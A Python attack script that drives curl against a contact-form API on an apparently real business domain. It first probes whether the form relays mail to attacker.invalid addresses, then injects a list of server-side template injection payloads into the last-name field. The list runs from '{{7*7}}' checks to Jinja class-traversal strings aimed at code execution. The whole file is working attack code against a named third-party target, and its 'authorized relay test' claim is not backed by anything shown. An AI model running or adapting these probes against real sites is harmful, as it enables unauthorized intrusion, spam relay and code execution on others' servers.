import subprocess, os, json

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
EP = 'https://www.infinitycapital.bh/api/send'


def post(fields, tag):
    cmd = ['curl', '-s', '-k', '-m', '45', '-A', UA, '-X', 'POST',
           '-w', '\n__C%{http_code}__T%{time_total}']
    for k, v in fields:
        cmd += ['-F', '%s=%s' % (k, v)]
    cmd += [EP]
    r = subprocess.run(cmd, capture_output=True, text=True)
    o = r.stdout
    i = o.rfind('__C')
    meta = o[i:].strip() if i >= 0 else 'NA'
    body = o[:i] if i >= 0 else o
    body = body.strip()
    sent = '"data":{"id"' in body.replace(' ', '')
    quota = 'quota' in body
    print('== %-24s %-32s %s%s' % (tag, meta, '[SENT] ' if sent else ('[QUOTA] ' if quota else ''), body[:180]))
    return body


def mk(**kw):
    f = [('fname', 'Probe'), ('lname', 'User'), ('areacode', '973'), ('tel', '3000000'),
         ('cname', 'probe@attacker.invalid'), ('subject', 'General Inquiry'),
         ('msg', 'd14 authorized relay test'), ('check', ''),
         ('targets', 'relay@attacker.invalid')]
    for k, v in kw.items():
        f = [(a, v if a == k else b) for a, b in f]
    return f


post(mk(), 'baseline')

SSTI = {
 'jinja7': '{{7*7}}', 'jinja_sp': '{{ 7 * 7 }}', 'jinja_cfg': '{{config}}',
 'jinja_cls': '{{7*7}}{{""}}',
 'ejs': '<%= 7*7 %>', 'nunj': '{{range(10)}}x{{end}}', 'mako': '${7*7}',
 'freemarker': '${7*7?c}', 'twig': '{{7*7}}', 'handlebars': '{{#if true}}Y{{/if}}',
 'erb': '<%= 7*7 %>', 'pug': '#{7*7}', 'velocity': '#set($x=7*7)$x',
 'thymeleaf': '__${7*7}__', 'spel': '${7*7}', 'el': '${7*7}',
 'jinja_cls2': "{{''.__class__.__mro__}}", 'jinja_rce': "{{''.__class__.__mro__[1].__subclasses__()}}",
}
print('\n########## SSTI in lname')
for n, p in SSTI.items():
    post(mk(lname=p), 'sst_ln_' + n)
